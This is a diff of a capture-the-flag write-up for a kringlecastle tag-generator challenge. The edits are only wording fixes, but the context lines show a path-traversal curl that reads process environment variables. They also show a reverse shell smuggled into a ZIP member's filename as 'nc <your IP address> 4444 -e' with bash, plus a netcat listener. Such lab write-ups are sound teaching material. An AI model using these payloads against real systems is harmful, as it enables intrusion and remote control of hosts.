@@ -18,7 +18,7 @@ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 [...]
 ```
-Using this the value of the environment variable can be obtained like this:
+Using this, the value of the environment variable can be obtained like this:
 ```
 curl https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ --output -
 PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
@@ -46,25 +46,25 @@ GREETZ=JackFrostWasHere
 ```
 
 ## Approach 3: Full Interactive Remote Shell
-**Option 1**
+**Option 1:**
 Create a ZIP file including an empty jpg file:
 ```
 touch joergen.jpg
 zip joergen.zip joergen.jpg
 ```
-Modify the contained filename to one with the shell command for the reverse shell (filename needs to end with an image extention as the application checks for that):
+Modify the contained filename to one with the shell command for the reverse shell (filename needs to end with an image extension as the application checks for that):
 ```
 printf "@ joergen.jpg\n@=';nc <your IP address> 4444 -e \`which bash\`;'.jpg\n" | zipnote -w joergen.zip
 ```
 
-**Option 2**
+**Option 2:**
 Create the tailored filename directly:
 ```
 touch \'\;nc\ <your IP address>\ 4444\ -e\ \`which\ bash\`\;\'.jpg
 zip joergen.zip \'\;nc\ <your IP address>\ 4444\ -e\ \`which\ bash\`\;\'.jpg
 ```
 
-**Common part**
+**Common part:**
 Start the reverse shell listener on your local device:
 ```
 nc -lnvp 4444
@@ -77,11 +77,11 @@ Now you have in the reverse shell listener an interactive shell as user `app`.
 The user `app` has write access to `/tmp` and `/home/app`.
 In addition the user has write access to `/usr/local/bundle`, where the web server is located.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTYwMzU0OTE1NCwtMTkyNjgxNzkyNCwyMT
-I1NTk5MDM2LDE0NDAwOTcwODMsLTkzNTgxMzI4OCwtNjEzNDQ5
-NjU2LC0xMDUyMTYzNjE3LC0xNzYzNTQxMzU1LDE2MDczNDg1MT
-QsLTgyMzA1MDg2MSwxMjkzNzIwNDM5LDEzOTU3OTQ4MjQsLTE1
-OTkyNTQ0MTUsLTYxOTI5NzQxMSwtNTc2NjEwMDc1LDIxMDc1Mj
-k4NDYsOTIyMTQ0MzUsLTM5ODQ5MTQ2MSwxMTUxNTU2ODk2LDIz
-ODQ2MDI3Ml19
+eyJoaXN0b3J5IjpbMTUzMjM4MTY1OSwxNTI5MTU4MzM3LC02MD
+M1NDkxNTQsLTE5MjY4MTc5MjQsMjEyNTU5OTAzNiwxNDQwMDk3
+MDgzLC05MzU4MTMyODgsLTYxMzQ0OTY1NiwtMTA1MjE2MzYxNy
+wtMTc2MzU0MTM1NSwxNjA3MzQ4NTE0LC04MjMwNTA4NjEsMTI5
+MzcyMDQzOSwxMzk1Nzk0ODI0LC0xNTk5MjU0NDE1LC02MTkyOT
+c0MTEsLTU3NjYxMDA3NSwyMTA3NTI5ODQ2LDkyMjE0NDM1LC0z
+OTg0OTE0NjFdfQ==
 -->
